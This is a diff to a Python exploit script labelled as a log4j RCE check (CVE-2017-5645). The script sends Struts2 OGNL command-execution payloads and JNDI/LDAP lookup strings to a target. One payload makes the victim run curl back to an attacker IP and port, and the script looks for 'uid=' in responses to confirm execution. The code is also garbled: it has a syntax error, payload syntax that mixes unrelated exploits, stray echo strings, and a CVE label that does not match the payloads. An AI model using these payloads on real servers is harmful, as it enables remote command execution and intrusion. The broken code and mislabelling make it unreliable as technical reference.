@@ -8,8 +8,8 @@ from urllib.parse import urlparse
 # Set up the command-line argument parser
 parser = argparse.ArgumentParser(description="Check for log4j RCE vulnerability (CVE-2017-5645)")
 parser.add_argument("-t", "--target", required=True, help="Target URL")
-parser.add_argument("-i", "--attackerIP", required=True, help="Attacker IP")
-parser.add_argument("-p", "--attackerPort", required=True, help="Attacker Port")
+parser.add_argument("-i", "--attackerIP", help="Attacker IP")
+parser.add_argument("-p", "--attackerPort", help="Attacker Port")
 parser.add_argument("-x", "--proxy", default="127.0.0.1:8080", help="Proxy server (default: 127.0.0.1:8080)")
 
 # Parse the command-line arguments
@@ -31,11 +31,12 @@ if not re.match(r"^([0-9]{1,3}\.){3}[0-9]{1,3}$", args.attackerIP):
 # Sanitize attacker port
 if not re.match(r"^[0-9]+$", args.attackerPort):
     parser.error("Invalid port format. Please enter a valid port number.")
-
+    
 # Construct the payloads
 payloads = []
 # Payload 0
-payload0 = "%{(#_='multipart/form-data')."
+payload0 = "${"
+payload0 += "%{(#_='multipart/form-data')."
 payload0 += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
 payload0 += "(#_memberAccess?"
 payload0 += "(#_memberAccess=#dm):"
@@ -53,9 +54,9 @@ payload0 += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOu
 payload0 += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
 payload0 += "(#ros.flush())}"
 payload0 += "${(#[new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%s).getInputStream()).useDelimiter(\"\\\\A\").next(),throw new java.lang.Exception(\"byPass\"))]}"
-payload0 += "${jndi:ldap://%s:%s/Basic/Object}" % (args.attackerIP, args.attackerPort)
-payload0 += "${ldap://%s:%s/Basic/Object}" % (args.attackerIP, args.attackerPort)
-
+payload0 += "${jndi:ldap://%s:%s/Basic/Object}" % (args.attackerIP or "127.0.0.1", args.attackerPort or "1389")
+payload0 += "${ldap://%s:%s/Basic/Object}" % (args.attackerIPor "127.0.0.1", args.attackerPort or "1389")
+payload0 += "}"
 payloads.append(payload0)
 
 # Payload 1 (continued)
@@ -65,6 +66,8 @@ payload1 += "?"
 payload1 += "x=@java.lang.Runtime@getRuntime().exec('curl http://{attackerIP}:{attackerPort}/success').getInputStream()"
 payload1 += "}"
 payload1 += "%7d"
+payload1 += "exec:echo 'hello world'"
+payload1 += "echo 'hello world'"
 
 payloads.append(payload1)
 
@@ -139,7 +142,7 @@ for i, payload in enumerate(payloads):
         else:
             print(f"Payload {i+1} failed to execute.")
     except:
-        print(f"Payload {i+1} failed to execute.")        
+        print(f"Payload {i+1} failed to execute.")      
         
 # Check the response for the payload
 if "uid=" in response.text:
